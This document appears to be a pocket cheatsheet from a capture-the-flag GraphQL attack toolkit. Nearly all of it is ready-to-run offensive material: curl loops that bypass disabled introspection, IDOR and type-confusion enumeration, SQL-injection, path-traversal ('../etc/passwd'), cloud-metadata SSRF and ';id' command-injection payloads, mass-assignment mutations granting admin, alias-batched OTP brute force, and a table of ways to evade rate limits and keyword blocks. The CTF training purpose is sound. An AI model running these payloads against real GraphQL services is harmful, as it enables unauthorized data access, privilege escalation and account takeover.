# Cheatsheet — the GraphQL pocket card

The whole skill compressed to the commands and decisions you'd actually run.
Every command verified against the real tool help.

---

## Detection — 30 seconds

```bash
# 1. is it graphql?
curl -s "$BASE/graphql" -d '{"query":"{__typename}"}' \
  -H 'Content-Type: application/json'
# → {"data":{"__typename":"Query"}} → yes
# → {"errors":[Cannot query field...]} → no graphql parser
# → 404/html → wrong path

# 2. fingerprint
curl -s "$BASE/graphql" -d '{"query":"{x"}' -H 'Content-Type: application/json'
# error grammar leaks the engine — detection.md §4

# 3. transports
for ct in application/json application/graphql \
          application/x-www-form-urlencoded text/plain; do
  curl -s "$BASE/graphql" -H "Content-Type: $ct" \
    -d 'query={__typename}' | head -c80; echo " ← $ct"
done
```

## Introspection — the one-shot

```bash
# full
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}' > schema.json

# bounded
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' > schema.json

# the tool
python3 tools/web/graphql_probe.py introspect --url "$BASE/graphql" \
  --headers "Authorization: Bearer $TOK"
```

## Introspection off — the four bypasses

```bash
# 1. _service{sdl} — federation, survives disableIntrospection
curl -s "$BASE/graphql" -d '{"query":"{_service{sdl}}"}' -H 'Content-Type: application/json'

# 2. __type side-channel
curl -s "$BASE/graphql" -d '{"query":"{__type(name:\"Query\"){fields{name}}}"}' \
  -H 'Content-Type: application/json'

# 3. suggestion oracle
python3 tools/web/graphql_probe.py suggest --url "$BASE/graphql" --field userss

# 4. mapped enumeration
python3 tools/web/graphql_probe.py map --url "$BASE/graphql" \
  --seed user,users,me,admin,flag,secret,token,debug,internal,config,env,log,audit
```

## The attack table — field name → play

| Field shape | The play |
|---|---|
| `flag`, `secret`, `admin*`, `debug*`, `internal*` | direct call — try bare, then common args |
| `user(id:)`, `file(id:)`, `document(id:)` | `id:other-id` — IDOR |
| `node(id:)` | `base64("Type:id")` — type-confusion IDOR |
| `users`, `allUsers`, `list*` | field-level authz on private cols |
| `search(q:)`, `filter(...)`, `where(...)` | `'` probe → driver text |
| `file(path:)`, `download(name:)`, `read(path:)` | `../etc/passwd` |
| `fetch(url:)`, `import(url:)`, `proxy(target:)` | `http://169.254.169.254/` |
| `exec(cmd:)`, `run(command:)`, `eval(code:)` | `;id` or `{{7*7}}` |
| `register(input:)`, `update*(input:)` | extra keys: `role:"admin"` |
| `*Role`, `grant*`, `promote*`, `setAdmin` | call as low-priv → privesc |
| `login`, `verify`, `otp` | alias-batch brute force |
| `upload(file:)` | multipart + traversal filename |
| `subscription{}` | `ws://` endpoint — different instance |

## The bypass table — block → route

| Blocked | Try |
|---|---|
| `__schema` | `__type(name:)`, `_service{sdl}`, suggestion oracle, bundle |
| POST+JSON | form-urlencoded, GET, text/plain, multipart, array batch |
| `mutation{` keyword | `{login(...)}` as query field, or via variables |
| `admin` name | `debug`, `internal`, `backdoor`, `hidden`, `private`, `config` |
| depth limit | alias-flat shape, batching |
| rate limit | alias-batch, array-batch, WS channel |
| alias cap | array batch, WS, multi-op docs |
| generic errors | `path` field, timing, status, length oracles |
| WS refused | `subscriptions.md` — both subprotocols, payload variants |
| `PersistedQuery*` | register hash, steal hash from bundle, replay+variables |

## The two-role diff — always run

```bash
for f in email phone role token sessions apiKey balance ssn; do
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
    -d "{\"query\":\"{user(id:$OTHER_ID){$f}}\"}" | jq -c '.data,.errors'
done
```

## The node-interface loop

```bash
for t in User Admin Flag Secret Config Session Order Document; do
  b64=$(echo -n "$t:1" | base64)
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
    -d "{\"query\":\"{node(id:\\\"$b64\\\"){__typename}}\"}" | jq -c '.data.node'
done
```

## The entity loop

```graphql
{_entities(representations:[{__typename:"User",id:"1"}]){... on User{email}}}
{_entities(representations:[{__typename:"Flag",id:"1"}]){... on Flag{value}}}
{_entities(representations:[{__typename:"Secret",id:"1"}]){... on Secret{value}}}
```

## The injection probe

```graphql
{user(name:"'"){id}}         # → errors[].message driver text?
{search(q:"'"){id}}
{filter(login:"'"){id}}
{get(name:"'"){id}}
{find(name:"'"){id}}
{lookup(name:"'"){id}}
```

## The mass-assign probe

```graphql
mutation{register(input:{username:"x",password:"y"}){id}}
mutation{register(input:{username:"x",password:"y",role:"admin"}){id}}
mutation{register(input:{username:"x",password:"y",isAdmin:true}){id}}
mutation{register(input:{username:"x",password:"y",verified:true}){id}}
mutation{register(input:{username:"x",password:"y",balance:99999}){id}}
mutation{register(input:{username:"x",password:"y",permissions:["*"]}){id}}
```

## The batching brute-force

```graphql
mutation{
  o1:verify(code:"000001"){ok}
  o2:verify(code:"000002"){ok}
  o3:verify(code:"000003"){ok}
  ...
}
```

## The hooks — the control plane

```bash
python3 tools/hooks.py pre-probe $CHAL \
  --request 'POST /graphql {...}' --class web-graphql --hypothesis-id h1

python3 tools/web/http_probe.py --challenge $CHAL \
  --url "$BASE/graphql" --body '{"query":"{...}"}' \
  --header 'Content-Type: application/json'
# emits post-probe command with --response filled — run it

python3 tools/hooks.py pre-flag $CHAL \
  --value 'flag{...}' --source response --evidence '"..."'
```

## The decision tree

```text
{__typename} → works?
├─ yes → {__schema{types{name}}} → introspection?
│   ├─ yes → read types → flag/admin/secret named? → direct call
│   │        → node()/_entities? → IDOR interface
│   │        → search/filter/q? → injection
│   │        → register/update? → mass-assign
│   │        → *Role/grant? → privesc
│   │        → subscription? → WS channel
│   └─ no → _service{sdl}? → federation bypass
│           → suggestions? → map --seed → recovered schema → same flow
│           → bundle has queries? → replay with hostile vars
│           → all channels dead → blind-graphql.md
└─ no → not graphql — class closed
```
